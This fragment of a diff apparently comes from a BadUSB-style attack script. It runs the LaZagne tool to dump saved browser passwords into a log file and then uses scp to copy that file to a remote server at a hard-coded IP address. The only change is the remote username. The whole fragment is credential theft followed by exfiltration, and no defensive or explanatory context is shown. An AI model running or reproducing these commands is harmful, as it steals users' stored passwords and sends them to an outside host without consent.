@@ -18,5 +18,5 @@ cd Windows
 
 python laZagne.py browsers > logs.txt
 
-scp logs.txt vnc@51.83.71.188:/home/mike/Desktop
+scp logs.txt badusb@51.83.71.188:/home/mike/Desktop
 
